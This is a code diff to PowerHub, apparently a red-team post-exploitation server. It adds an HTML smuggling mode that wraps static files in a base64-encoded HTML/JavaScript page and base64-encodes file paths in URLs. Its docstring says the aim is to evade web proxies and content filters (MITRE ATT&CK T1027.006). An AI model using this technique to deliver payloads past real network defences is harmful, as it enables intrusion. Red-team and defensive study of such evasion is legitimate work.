@@ -1,4 +1,4 @@
-from base64 import urlsafe_b64decode
+from base64 import b64encode, urlsafe_b64decode, urlsafe_b64encode
 import binascii
 from datetime import datetime
 from functools import wraps
@@ -10,6 +10,7 @@ from tempfile import TemporaryDirectory
 import flask.cli
 from flask import Blueprint, render_template, request, Response, redirect, \
          send_from_directory, flash, abort, make_response
+from werkzeug.utils import safe_join
 
 from powerhub.sql import get_clip_entry_list
 from powerhub.stager import build_cradle
@@ -411,15 +412,56 @@ def list_static():
         directory['files'].sort()
         directory['subdirs'].sort(key=lambda x: x['name'])
         return directory
+    dlmode = request.args.get('dlmode', 'direct')
+    if dlmode not in ('direct', 'smuggle'):
+        dlmode = 'direct'
     context = {
-        'rootdir': get_dir(directories.STATIC_DIR)
+        'rootdir': get_dir(directories.STATIC_DIR),
+        'dlmode': dlmode,
     }
     return render_template('html/list-static.html', **context)
+
+
+@app.app_template_filter()
+def u64(s):
+    """URL-safe base64 encode a string"""
+    return urlsafe_b64encode(s.encode()).decode()
+
+
+def smuggle_file(filename):
+    """Wrap a static file in an HTML page that downloads it client-side
+    (HTML smuggling)
+
+    ``filename`` is the URL-safe base64 encoding of the file's path
+    relative to the static directory. Encoding the path keeps the file
+    name (e.g. the file extension) out of the URL, which tricks web
+    proxies that filter requests based on file names.
+
+    The file's content is base64-encoded and embedded into an HTML page.
+    The embedded JavaScript reassembles the file in the browser and triggers
+    a download. Only HTML and JavaScript cross the wire, so content filters
+    that inspect file contents or block certain MIME types won't see the
+    file itself (MITRE ATT&CK T1027.006).
+    """
+    try:
+        relpath = urlsafe_b64decode(filename).decode()
+        path = safe_join(directories.STATIC_DIR, relpath)
+        with open(path, 'rb') as f:
+            data = b64encode(f.read()).decode()
+    except (binascii.Error, OSError, TypeError, ValueError):
+        abort(404)
+    return render_template(
+        'html/static-smuggled.html',
+        filename=os.path.basename(relpath),
+        data=data,
+    )
 
 
 @app.route('/static/<path:filename>')
 def server_static(filename):
     try:
+        if 'smuggle' in request.args:
+            return smuggle_file(filename)
         return send_from_directory(directories.STATIC_DIR,
                                    filename,
                                    as_attachment=False)
